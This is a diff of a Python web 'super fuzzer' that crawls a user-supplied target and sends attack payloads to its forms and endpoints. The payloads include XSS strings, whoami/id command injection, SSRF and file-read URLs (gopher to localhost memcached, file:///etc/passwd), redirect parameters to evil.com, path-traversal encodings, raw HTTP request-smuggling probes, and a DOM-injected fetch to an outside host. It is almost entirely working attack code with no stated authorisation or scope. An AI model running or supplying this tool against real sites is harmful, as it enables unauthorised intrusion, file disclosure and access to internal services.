@@ -24,205 +24,276 @@
 ═══════════════════════════════════════════════════════════════════════════
 """
 
-import requests, socket, time, json, random, contextlib
-from pathlib import Path
+# ── Imports ────────────────────────────────────────────────────────────
+import requests, random, urllib.parse, socket, time, contextlib
 from collections import deque
-from urllib.parse import urlparse, urljoin, quote, urlencode
-from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
+from urllib.parse import urlparse, urljoin, urlencode, quote
+from pathlib import Path
+from playwright.sync_api import (
+    sync_playwright,
+    TimeoutError as PWTimeout,
+)
 
-# ─── constants ──────────────────────────────────────────────────────────
-PAGE_TIMEOUT = 30_000      # ms
+# ── Constants / Logging ────────────────────────────────────────────────
+PAGE_TIMEOUT = 30_000         # ms
 RETRIES      = 1
 LOG_FILE     = Path("super_fuzz.log")
 LOG_FILE.write_text("", encoding="utf-8")      # reset
 
-# ─── logger ─────────────────────────────────────────────────────────────
-def log(msg, tag="*",):
+def log(msg, tag="*"):
     line = f"[{tag}] {msg}"
     try:
         print(line)
-    except UnicodeEncodeError:            # Windows CP‑1252 safe
-        print(line.encode("ascii","ignore").decode())
+    except UnicodeEncodeError:
+        print(line.encode("ascii", "ignore").decode())
     with open(LOG_FILE, "a", encoding="utf-8") as fp:
         fp.write(line + "\n")
 
-# ─── Playwright loader ─────────────────────────────────────────────────
-# ─── Playwright loader (replace old open_page) ──────────────────────────
+# ── Playwright helper ──────────────────────────────────────────────────
 def open_page(p, url, timeout=PAGE_TIMEOUT, retries=RETRIES):
-    """
-    Attempt to navigate; on ANY failure return (None, None, None)
-    so caller can safely `continue`.
-    """
-    for a in range(retries + 1):
+    for attempt in range(retries + 1):
         try:
             br = p.chromium.launch(headless=True, args=["--disable-web-security"])
             ctx = br.new_context(ignore_https_errors=True)
             pg  = ctx.new_page()
             pg.goto(url, timeout=timeout)
             return br, ctx, pg
-        except Exception as e:                           # <- catch all
-            log(f"Playwright fail ({a+1}/{retries+1}) – {url} – {e}", "!")
+        except Exception as e:
+            log(f"Playwright fail ({attempt+1}/{retries+1}) – {url} – {e}", "!")
             with contextlib.suppress(Exception):
                 br.close()
     return None, None, None
 
-# ╭────────────────────  SMART SPA / API / FORM CRAWLER  ───────────────╮ #
-def smart_crawl(seed, p, max_depth=2, same_origin=True):
-    origin = "{0.scheme}://{0.netloc}".format(urlparse(seed))
-    discovered, queued = {seed}, deque([(seed,0)])
-    endpoints = set()
-
-    while queued:
-        current, depth = queued.popleft()
-        if depth > max_depth: continue
-
-        br, ctx, page = open_page(p, current)
-        if not page:   continue
-
-        # track dynamic requests (XHR / fetch / WS)
-        page.on("request", lambda req, s=endpoints: s.add(req.url))
-
-        # detect all forms
-        forms = page.query_selector_all("form")
-        for f in forms:
-            action = f.get_attribute("action") or current
-            method = (f.get_attribute("method") or "get").lower()
-            inputs = [i.get_attribute("name") or "p" for i in f.query_selector_all("input,textarea,select")]
-            endpoints.add(urljoin(current, action))
-            fuzz_html_form(urljoin(current, action), method, inputs)
-
-        # wait for network idle, then collect links
-        with contextlib.suppress(PWTimeout):
-            page.wait_for_load_state("networkidle", timeout=6000)
-
-        links = page.evaluate("""() => Array.from(
-             document.querySelectorAll('[href],[routerLink],a'))
-             .map(e=>e.href || e.getAttribute('href') || e.getAttribute('routerLink'))""")
-
-        br.close()
-        for raw in set(links):
-            if not raw: continue
-            url = urljoin(current, raw)
-            if same_origin and not url.startswith(origin): continue
-            if url not in discovered:
-                discovered.add(url); queued.append((url, depth+1))
-
-    log(f"Crawler → {len(discovered)} pages, {len(endpoints)} API/form endpoints", "+")
-    return discovered | endpoints
-# ╰──────────────────────────────────────────────────────────────────────╯ #
-
-# ╭────────────────────  FORM‑FUZZ HELPER  ──────────────────────────────╮ #
-def ai_mutate(s):         # lightweight obfuscator
-    variants=[s[::-1], quote(s), s.replace(" ","%20"), ''.join(random.sample(s,len(s)))]
+# ── AI‑style payload mutator ───────────────────────────────────────────
+def ai_mutate(payload):
+    variants = [
+        payload[::-1],
+        urllib.parse.quote(payload),
+        payload.replace(" ", "%20"),
+        payload.replace("id", "whoami"),
+        payload.replace("alert", "Function('al'+'ert(1)')()"),
+        ''.join(random.sample(payload, len(payload))),
+    ]
     return random.choice(variants)
 
+# ── Form fuzzer ────────────────────────────────────────────────────────
 def fuzz_html_form(action, method, fields):
-    sample = {"id": "whoami", "q": "<svg/onload=alert(1)>", "pwn": "gopher://127.0.0.1/"}
-    data   = {f: ai_mutate(random.choice(list(sample.values()))) for f in fields}
+    samples = {
+        "id": "whoami",
+        "q": "<svg/onload=alert(1)>",
+        "x": "gopher://127.0.0.1/",
+        "search": "data:text/html,<script>alert(9)</script>",
+    }
+    data = {f: ai_mutate(random.choice(list(samples.values()))) for f in fields}
     try:
-        if method=="post":
-            r=requests.post(action, data=data, timeout=5)
+        if method == "post":
+            r = requests.post(action, data=data, timeout=5)
         else:
-            r=requests.get(action+"?"+urlencode(data, doseq=True), timeout=5)
-        hit = any(k in r.text for k in ("uid=","root:","<svg","alert("))
-        if hit: log(f"Form endpoint vulnerable → {action}", "✓")
-    except requests.RequestException: pass
-# ╰──────────────────────────────────────────────────────────────────────╯ #
+            r = requests.get(action + "?" + urlencode(data), timeout=5)
+        if any(k in r.text for k in ("uid=", "root:", "alert(", "<svg")):
+            log(f"Form vulnerable → {action}", "✓")
+    except requests.RequestException:
+        pass
 
-# ╭────────────────────  SERVER‑SIDE ATTACKS  ───────────────────────────╮ #
+# ── Smart SPA / API crawler ────────────────────────────────────────────
+def smart_crawl(seed, p, max_depth=2, same_origin=True):
+    origin = "{0.scheme}://{0.netloc}".format(urlparse(seed))
+    discovered, endpoints = {seed}, set()
+    queue = deque([(seed, 0)])
+
+    while queue:
+        current, depth = queue.popleft()
+        if depth > max_depth:
+            continue
+
+        br, ctx, page = open_page(p, current)
+        if not page:
+            continue
+
+        # gather XHR / fetch / WS
+        page.on("request", lambda req: endpoints.add(req.url))
+
+        # fuzz every form
+        for form in page.query_selector_all("form"):
+            action = form.get_attribute("action") or current
+            method = (form.get_attribute("method") or "get").lower()
+            fields = [i.get_attribute("name") or f"field{i}" 
+                    for i in form.query_selector_all("input,textarea,select")]
+
+            endpoints.add(urljoin(current, action))      # ← NEW: track form action
+            fuzz_html_form(urljoin(current, action), method, fields)
+
+
+        with contextlib.suppress(PWTimeout):
+            page.wait_for_load_state("networkidle", timeout=5000)
+
+        # collect links
+        links = page.evaluate("""() => Array.from(
+            document.querySelectorAll('[href],[routerLink],a'))
+            .map(e => e.href || e.getAttribute('href') || e.getAttribute('routerLink'))""")
+
+        br.close()
+
+        for raw in set(links):
+            if not raw:
+                continue
+            url = urljoin(current, raw)
+            if same_origin and not url.startswith(origin):
+                continue
+            if url not in discovered:
+                discovered.add(url)
+                queue.append((url, depth + 1))
+
+    log(f"Crawler → {len(discovered)} pages, {len(endpoints)} endpoints", "+")
+    return discovered | endpoints
+
+# ── Server‑side attack modules ─────────────────────────────────────────
 def recursive_param(u):
-    for t in ["?x=http://evil.com?y=whoami","?next=/dash?redir=//evil","?url=http://v/?c=id"]:
-        try:
-            r=requests.get(u+t,timeout=5)
-            if any(k in r.text for k in("uid=","root:")): log("Param recursion "+u+t,"✓")
-        except: pass
+    suffixes = [
+        "?x=http://evil.com?y=whoami",
+        "?next=/dashboard?redir=https://evil.com",
+        "?url=http://site.com/path?cmd=id",
+    ]
+    for s in suffixes:
+        with contextlib.suppress(Exception):
+            r = requests.get(u + s, timeout=5)
+            if any(x in r.text for x in ("uid=", "root:")):
+                log("Recursive param RCE → " + u + s, "✓")
 
 def protocol_abuse(u):
-    for p in ["gopher://127.0.0.1:11211/_stats","file:///etc/passwd",
-              "data:text/html,<img src=x onerror=alert(9)>","blob:http://localhost"]:
-        try:
-            r=requests.get(u+"?p="+quote(p),timeout=5)
-            if any(k in r.text for k in("uid=","root:")): log("Protocol "+p,"✓")
-        except: pass
+    schemes = [
+        "gopher://127.0.0.1:11211/_stats",
+        "file:///etc/passwd",
+        "blob:http://localhost",
+        "data:text/html,<script>alert(6)</script>",
+    ]
+    for proto in schemes:
+        with contextlib.suppress(Exception):
+            r = requests.get(u + "?p=" + quote(proto), timeout=5)
+            if any(x in r.text for x in ("uid=", "root:")):
+                log("Protocol abuse → " + proto, "✓")
 
 def split_eval(u):
-    for f in ['";alert','("XSS")']:
-        try:
-            if "<script" in requests.get(u+"?q="+quote(f)).text: log("Split‑eval "+f,"✓")
-        except: pass
+    for frag in ['";alert', '("XSS")', "';alert", "('alert')"]:
+        with contextlib.suppress(Exception):
+            r = requests.get(u + "?q=" + quote(frag))
+            if any(tag in r.text for tag in ("<script", "alert(", "XSS")):
+                log("Split‑eval triggered → " + frag, "✓")
 
 def mime_confuse(u):
     with contextlib.suppress(Exception):
-        if "<script" in requests.post(u,"<script>alert`1`</script>",
-                                      headers={"Content-Type":"application/json"}).text:
-            log("MIME confusion ✓","✓")
+        r = requests.post(u, "<script>alert(1)</script>", headers={"Content-Type": "application/json"})
+        if "<script" in r.text:
+            log("MIME confusion success", "✓")
 
 def unicode_path(u):
-    for e in ("%252e%252e","%c0%ae%c0%ae","%u202e"):
+    for enc in ("%252e%252e", "%c0%ae%c0%ae", "%u202e"):
         with contextlib.suppress(Exception):
-            if "root" in requests.get(f"{u}/{e}/").text: log("Unicode bypass "+e,"✓")
+            r = requests.get(f"{u}/{enc}/")
+            if "root:" in r.text or "conf" in r.text:
+                log("Unicode bypass → " + enc, "✓")
 
 def crlf_smuggle(host):
-    pay=(f"GET / HTTP/1.1\r\nHost:{host}\r\nX:1\r\n\r\nPOST /admin HTTP/1.1\r\n\r\n")
+    payload = f"GET / HTTP/1.1\r\nHost:{host}\r\nX:Y\r\n\r\nPOST /admin HTTP/1.1\r\n\r\n"
     with contextlib.suppress(Exception):
-        sock=socket.create_connection((host,80),timeout=3)
-        sock.sendall(pay.encode()); sock.close(); log("CRLF smuggle probe","+")
-# ╰──────────────────────────────────────────────────────────────────────╯ #
+        s = socket.create_connection((host, 80), timeout=4)
+        s.send(payload.encode()); s.close()
+        log("CRLF smuggle probe sent", "+")
 
-# ╭────────────────────  CLIENT / DOM ATTACKS  ──────────────────────────╮ #
-def dom_clipboard(u,p):
-    br,_,pg=open_page(p,u); 
+def chunk_desync(host):
+    raw = f"POST / HTTP/1.1\r\nHost:{host}\r\nTransfer-Encoding:chunked\r\n\r\n0\r\n\r\n"
+    with contextlib.suppress(Exception):
+        s = socket.create_connection((host, 80), timeout=4)
+        s.send(raw.encode()); s.close()
+        log("Chunk‑desync probe sent", "+")
+
+# ── Client‑side DOM attack modules ─────────────────────────────────────
+def dom_clipboard(u, p):
+    br,_,pg = open_page(p, u)
     if pg:
         pg.evaluate("""document.body.innerHTML+='<input oncopy=fetch("http://dns.x")>'""")
-        log("Clipboard payload ✓","✓"); br.close()
+        log("Clipboard payload ✓", "✓"); br.close()
 
-def dom_ppollute(u,p):
-    br,_,pg=open_page(p,u); 
+def dom_prototype_pollution(u, p):
+    br,_,pg = open_page(p, u)
     if pg:
-        pg.on("console",lambda m:"[PP]"in m.text and log("Prototype polluted","✓"))
+        pg.on("console", lambda m:"[PP]" in m.text and log("Prototype polluted","✓"))
         pg.evaluate("""let e=JSON.parse('{"__proto__":{"polluted":"yes"}}');Object.assign({},e);
-                        console.log('[PP]'+{}.polluted)"""); br.close()
+                       console.log("[PP]"+{}.polluted)""")
+        br.close()
 
-def dom_ws(u,p):
-    br,_,pg=open_page(p,u)
+def dom_websocket_injection(u, p):
+    br,_,pg = open_page(p, u)
     if pg:
-        pg.on("console",lambda m:"[WS]"in m.text and log("WS echo ✓","✓"))
-        pg.evaluate("""let w=new WebSocket("wss://echo.websocket.events");
+        pg.on("console", lambda m:"[WS]" in m.text and log("WS echo XSS ✓","✓"))
+        pg.evaluate("""const w=new WebSocket("wss://echo.websocket.events");
                        w.onopen=()=>w.send("<svg/onload=alert(2)>");
-                       w.onmessage=e=>console.log("[WS]"+e.data)""")
-        time.sleep(1.3); br.close()
+                       w.onmessage=e=>console.log("[WS]"+e.data);""")
+        time.sleep(1.2); br.close()
 
-def dom_async(u,p):
-    br,_,pg=open_page(p,u)
+def dom_async_timing(u, p):
+    br,_,pg = open_page(p, u)
     if pg:
-        pg.evaluate("""(async()=>{let x=await new Promise(r=>setTimeout(()=>r('alert(7)'),150));eval(x)})();""")
-        log("Async race ✓","✓"); br.close()
+        pg.evaluate("(async()=>{let x=await new Promise(r=>setTimeout(()=>r('alert(7)'),150));eval(x)})();")
+        log("Async race ✓", "✓"); br.close()
 
-def dom_iframe(u,p):
-    br,_,pg=open_page(p,u)
+def dom_iframe_clone(u, p):
+    br,_,pg = open_page(p, u)
     if pg:
-        pg.evaluate("""let f=document.createElement('iframe');f.srcdoc='<script>alert(99)</script>';
-                       document.body.appendChild(f)"""); log("Iframe clone ✓","✓"); br.close()
-# ╰──────────────────────────────────────────────────────────────────────╯ #
+        pg.evaluate("""let f=document.createElement('iframe');
+                       f.srcdoc='<script>alert(99)</script>';document.body.appendChild(f)""")
+        log("Iframe clone ✓", "✓"); br.close()
 
-# ╭─────────────────────────────  MASTER  ───────────────────────────────╮ #
-def run(seed):
-    host=urlparse(seed).hostname or seed
-    log(f"Seed → {seed}","◆")
+def dom_mutation_observer(u, p):
+    br,_,pg = open_page(p, u)
+    if pg:
+        pg.evaluate("""new MutationObserver(()=>alert('MutationX'))
+                       .observe(document.body,{childList:true,subtree:true});
+                       document.body.appendChild(document.createElement('div'));""")
+        log("MutationObserver ✓", "✓"); br.close()
 
+# ── Orchestrator ───────────────────────────────────────────────────────
+def run(seed_url):
+    host = urlparse(seed_url).hostname or seed_url
+    log(f"Seed → {seed_url}", "◆")
+
+    # Crawl
     with sync_playwright() as p:
-        scope=smart_crawl(seed,p,max_depth=2)
+        scope = smart_crawl(seed_url, p, max_depth=2)
+    log(f"Targets discovered: {len(scope)}", "+")
+
+    # Server‑side fuzz
     for u in scope:
-        recursive_param(u); protocol_abuse(u); split_eval(u)
-        mime_confuse(u); unicode_path(u)
+        recursive_param(u)
+        protocol_abuse(u)
+        split_eval(u)
+        mime_confuse(u)
+        unicode_path(u)
+
     crlf_smuggle(host)
+    chunk_desync(host)
 
+    # Client‑side fuzz
     with sync_playwright() as p:
-        dom_clipboard(seed,p); dom_ppollute(seed,p)
-        dom_ws(seed,p); dom_async(seed,p); dom_iframe(seed,p)
+        dom_clipboard(seed_url, p)
+        dom_prototype_pollution(seed_url, p)
+        dom_websocket_injection(seed_url, p)
+        dom_async_timing(seed_url, p)
+        dom_iframe_clone(seed_url, p)
+        dom_mutation_observer(seed_url, p)
 
-    log("SUPER‑FUZZ COMPLETE","◆")
-# ╰──────────────────────────────────────────────────────────────────────╯ #
+    log("✅ SUPER‑FUZZER COMPLETE", "✓")
+
+# ── Entry ──────────────────────────────────────────────────────────────
+if __name__ == "__main__":
+    try:
+        target = input("Target URL: ").strip()
+        run(target)
+    except KeyboardInterrupt:
+        log("Aborted by user", "!")
+    except Exception as e:
+        log(f"Fatal error: {e}", "✘")
+
 
 if __name__=="__main__":
     try: run(input("Target URL: ").strip())
